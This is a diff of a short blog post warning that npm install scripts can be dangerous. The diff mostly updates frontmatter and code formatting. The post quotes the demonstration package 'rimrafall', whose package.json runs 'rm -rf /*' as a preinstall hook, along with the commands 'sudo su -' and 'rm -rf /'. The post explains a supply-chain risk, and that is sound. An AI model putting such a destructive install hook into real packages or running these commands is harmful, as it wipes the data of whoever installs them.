@@ -1,8 +1,12 @@
 ---
 title: npm install - could be dangerous
-author: chris
+author: Christoph Hartmann
 date: 2015-05-09
-template: article.jade
+tags:
+  - nodejs
+  - security
+aliases:
+  - /articles/npm-dependency-could-be-dangerous/
 ---
 
 [NPM](https://www.npmjs.com/) hosts about 144,000 npm modules on their registry. Over one million modules are downloaded per month. Assume you use one module that includes a major flaw in their implementation? Will you detect it?
@@ -11,28 +15,32 @@ template: article.jade
 
 Just recently, [João Jerónimo](https://github.com/joaojeronimo) published a special npm modules called [rimrafall](https://github.com/joaojeronimo/rimrafall). He published it at npm and posted it on [Hacker News](https://news.ycombinator.com/item?id=8947493). Essentially this module does the following:
 
-    sudo su -
-    rm -rf /
+```bash
+sudo su -
+rm -rf /
+```
 
 It uses a special script tag in `package.json` to run a prescript. Commonly it is used to build native code, but still can be used to do anything that bash can.
 
 The package.json looks as follows:
 
-    {
-      "name": "rimrafall",
-      "version": "1.0.0",
-      "description": "rm -rf /* # DO NOT INSTALL THIS",
-      "main": "index.js",
-      "scripts": {
-        "preinstall": "rm -rf /*"
-      },
-      "keywords": [
-        "rimraf",
-        "rmrf"
-      ],
-      "author": "João Jerónimo",
-      "license": "ISC"
-    }
+```json
+{
+  "name": "rimrafall",
+  "version": "1.0.0",
+  "description": "rm -rf /* # DO NOT INSTALL THIS",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "rm -rf /*"
+  },
+  "keywords": [
+    "rimraf",
+    "rmrf"
+  ],
+  "author": "João Jerónimo",
+  "license": "ISC"
+}
+```
 
 ## Risk
 
